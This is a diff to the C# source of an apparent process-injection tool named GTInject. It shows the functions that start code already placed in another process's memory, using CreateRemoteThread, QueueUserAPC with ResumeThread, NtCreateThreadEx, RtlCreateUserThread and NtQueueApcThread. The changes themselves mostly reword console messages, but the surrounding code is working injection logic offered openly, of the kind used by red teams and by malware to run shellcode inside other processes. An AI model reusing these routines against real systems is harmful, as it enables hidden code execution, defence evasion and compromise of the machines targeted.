@@ -26,10 +26,10 @@ namespace GTInject.Injection
                 case 202:
                     return execopt202(memaddr, pid, tid);
                 default:
-                    Console.WriteLine( " not a valid Thread Execution option integer");
+                    Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                     return IntPtr.Zero;
             }
-            return IntPtr.Zero;
+
         }
 
         private static IntPtr execopt100(IntPtr memaddr, Process ProcID, int ThreadID)
@@ -38,9 +38,10 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 100 == CreateRemoteThread (WINAPI)
             /////////////////////////////////////
-            
+
+            Console.WriteLine("     Execute code using WINAPIs CreateRemoteThread");
             IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
-            Console.WriteLine( " called CreateRemoteThread at : " + remoteThreadResp);
+            Console.WriteLine("     Called CreateRemoteThread with response : " + remoteThreadResp);
             return remoteThreadResp;
         }
 
@@ -49,17 +50,18 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 101 == QueueUserAPC & ResumeThread (WINAPI)
             /////////////////////////////////////
-            Console.WriteLine( " Thread exec with WINAPI Q User APC and Resume Thread");
+            Console.WriteLine("     Execute code using WINAPIs QueueUserAPC, ResumeThread");
+
             //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
             var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
 
-            Console.WriteLine(  " Returned OpenThread " + threadHandle);
+            Console.WriteLine("     Returned OpenThread " + threadHandle);
 
             var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);
 
             if (QuApcResp == 0) // if succeeds, return value is non-zero
             {
-                Console.WriteLine(" [-] Failed QueueUserAPC WINAPI execution");
+                Console.WriteLine("[-] Failed QueueUserAPC WINAPI execution");
                 return IntPtr.Zero;
             }
             else
@@ -69,11 +71,11 @@ namespace GTInject.Injection
                 {
                     if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                     {
-                        Console.WriteLine(" thread is suspended, so calling resume Thread WINAPI on this");
+                        Console.WriteLine("     thread is suspended, so calling resume Thread WINAPI on this");
                         var ResThreadResp = ResumeThread(threadHandle);
                         if (ResThreadResp == -1)
                         {
-                            Console.WriteLine("resume Thread failed");
+                            Console.WriteLine("     resume Thread failed");
                             return IntPtr.Zero;
                         }
                     }
@@ -94,8 +96,12 @@ namespace GTInject.Injection
             //Create a remote thread and execute it.
             //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
 
+            Console.WriteLine("     Execute code using NTAPIs NtCreateThreadEx");
+
             IntPtr hRemoteThread;
             uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            Console.WriteLine("    Called NtCreateThreadEx with response : " + hThread);
+
             return hRemoteThread;
         }
 
@@ -104,19 +110,18 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 201 == RtlCreateUserThread (NTAPI)
             /////////////////////////////////////
-            ///
-            Console.WriteLine(  " RtlCreateUserThread being called for exec");
+            Console.WriteLine("     Execute code using NTAPIs RtlCreateUserThread");
             IntPtr targetThread = IntPtr.Zero;
             ClientId id = new ClientId();
             int hthread = RtlCreateUserThread(ProcID.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memaddr, IntPtr.Zero, ref targetThread, ref id);
             if (hthread == 0)
             {
-                Console.WriteLine(" RtlCreateUserThread resp : " + hthread);
+                Console.WriteLine("     RtlCreateUserThread resp : " + hthread);
                 return targetThread;
             }
             else
             {
-                Console.WriteLine(  " [-] RtlCreateUserThread Failed");
+                Console.WriteLine("[-] RtlCreateUserThread Failed");
                 return IntPtr.Zero;
             }
         }
@@ -128,8 +133,8 @@ namespace GTInject.Injection
             // OPTION 202 == NtQueueApcThread, NtResumeThread (NTAPI)
             /////////////////////////////////////        
             // Will also need NtOpenThread? 
+            Console.WriteLine("     Execute code using NTAPIs NtQueueApcThread, NtResumeThread");
 
-            Console.WriteLine(  " NTAPI to open a thread, NtQueueApcThread and NtResumeThread");
             //var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
 /*            IntPtr targetThread = (IntPtr)ThreadID;
             ClientId id = new ClientId();
@@ -141,12 +146,12 @@ namespace GTInject.Injection
             var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
 
             //Console.WriteLine(  " NtOpenThread Response : " + NtOpenTResp);
-            Console.WriteLine(  "returned thread handle " + targetThread);
+            Console.WriteLine("     returned thread handle " + targetThread);
 
             var ntQResp = NtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
             if (ntQResp != 0)
             {
-                Console.WriteLine( " ntQResp was non-success");
+                Console.WriteLine("     ntQResp was non-success");
                 return IntPtr.Zero;
             }
             else
@@ -156,16 +161,16 @@ namespace GTInject.Injection
                 {
                     if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                     {
-                        Console.WriteLine(" thread is suspended, so calling NtResumeThread on this");
+                        Console.WriteLine("     thread is suspended, so calling NtResumeThread on this");
                         var ntResTResp = NtResumeThread(targetThread, 0);
                         if (ntResTResp != 0)
                         {
-                            Console.WriteLine("resume Thread failed");
+                            Console.WriteLine("     resume Thread failed");
                             return IntPtr.Zero;
                         }
                     }
                 }
-                Console.WriteLine(  "NTAPI for NtQueueApcThread executed");
+                Console.WriteLine("     NTAPI for NtQueueApcThread executed");
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
         }
